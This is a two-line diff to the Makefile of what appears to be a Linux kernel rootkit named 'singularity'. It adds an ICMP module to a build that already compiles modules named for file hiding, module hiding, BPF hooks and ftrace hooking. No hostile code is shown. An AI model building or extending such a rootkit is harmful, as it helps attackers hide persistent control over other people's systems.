@@ -14,6 +14,7 @@ singularity-objs := main.o \
     modules/hiding_readlink.o \
     modules/open.o \
     modules/bpf_hook.o \
+    modules/icmp.o \
     modules/hide_module.o ftrace/ftrace_helper.o
 
 all:
